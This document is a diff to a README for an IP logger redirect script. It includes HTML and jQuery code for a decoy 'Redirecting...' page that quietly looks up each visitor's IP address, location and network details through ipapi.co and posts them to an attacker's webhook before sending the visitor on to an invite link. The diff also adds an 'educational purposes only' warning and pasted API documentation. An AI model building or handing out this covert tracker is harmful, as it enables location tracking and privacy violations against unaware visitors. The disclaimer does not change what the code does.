@@ -1,5 +1,3 @@
-
-
 ---
 
 # IP Logger Redirect Script
@@ -24,7 +22,7 @@ This repository contains a script designed to log IP addresses and other informa
   <head>
     <title>Redirecting...</title>
     <meta charset="utf-8" />
-    <h1><center>Star the repo pls</center></h1>
+    <h1><center>Star the repo please</center></h1>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" charset="utf-8"></script>
   </head>
   <body>
@@ -38,9 +36,9 @@ This repository contains a script designed to log IP addresses and other informa
 ### JavaScript
 
 ```javascript
-var WEBURL = " Webhook link here";
+var WEBURL = "Webhook link here";
 
-$.getJSON("https://ipapi.co/json/", function (data) {
+$.getJSON("https://ipapi.co/json/", function (data) {  //Visit https://ipapi.co for more commands
    $.post(WEBURL, {
         content:
           "Ip : " +
@@ -68,12 +66,51 @@ $.getJSON("https://ipapi.co/json/", function (data) {
       });
 });
 
-window.location.href = " INVITE LINK OR ANY OTHER LINK";
+window.location.href = "Invite link or other links here";
 ```
 
 ## Ethical Considerations
 
 Please be aware that logging personal information without the user's consent is unethical and potentially illegal. This script collects and sends sensitive information such as IP address, location, and other details to a third party. Use this script responsibly and ensure compliance with privacy laws and regulations.
+
+## Warning
+
+This script is intended for **educational purposes only**. Misuse of this code to collect personal information without consent is prohibited. Always respect user privacy and obtain proper consent before collecting any personal information.
+
+## Documentation for IP Address Location API
+
+[ipapi.co](https://ipapi.co) provides a REST API to find the location of an IP address.
+
+Specifically, you can get the following information for any IP address:
+- City
+- Region (name & code)
+- Country (name & code)
+- Continent
+- Postal code / zip code
+- Latitude
+- Longitude
+- Timezone
+- UTC offset
+- European Union (EU) membership
+- Country calling code
+- Country capital
+- Country TLD (top-level domain)
+- Currency (name & code)
+- Area & population of the country
+- Languages spoken
+- ASN
+- Organization
+- Hostname*
+
+* Hostname is an optional add-on, currently in beta. Please contact us to learn more about it or to enable it for your account.
+
+The API can also help you to find the public IP address of a device.
+
+The API can be integrated into your application either on the server side or on the client side. The documentation below uses JSON format as an example. Other supported formats are XML, CSV, YAML, and JSONP.
+
+Both IPv4 & IPv6 type addresses are supported.
+
+Please refer to the right pane for examples in Ruby, Python, PHP, Javascript, Node.js, jQuery, Java, C#, and Go. If your language of choice isn’t listed here, it doesn’t mean that the API can’t handle it, as long as you can send an HTTP web request and consume the response. Please contact us for any support requests.
 
 ## Usage
 
